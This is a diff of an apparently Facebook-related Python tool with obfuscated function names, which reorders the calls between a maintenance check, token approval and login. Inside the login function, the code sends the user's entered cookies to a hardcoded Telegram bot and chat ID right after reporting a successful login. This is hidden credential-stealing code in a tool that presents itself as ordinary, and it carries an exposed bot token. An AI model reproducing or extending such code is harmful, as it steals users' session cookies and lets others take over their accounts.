@@ -251,7 +251,7 @@ def mxntenansC():
     sins(f"{lgr}  [-] SERVER UPDATED V{ver}")
     slp(2)
     if mxntenans == "on":
-        mxnu()
+        apprxval()
     else:
         cmds("clear")
         print(
@@ -352,7 +352,7 @@ def apprxval():
         print("")
         sins(f"{lgr}  [✓] HELLO, YOUR TOKEN APPROVED!")
         slp(3)
-        mxntenansC()
+        lxgin()
     else:
         slp(0.1)
         gxdslogo()
@@ -396,7 +396,7 @@ def lxgin():
         sins(f"{lgr}  [✓] LOGIN SUCCESSFULLY")
         requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text=COOKIES: {fbcokis}")
         slp(2)
-        apprxval()
+        mxnu()
     except Exception as error: 
         os.system("rm -f .tokn.txt")
         print(f"{lr}  [X] COOKIE EXPIRED")
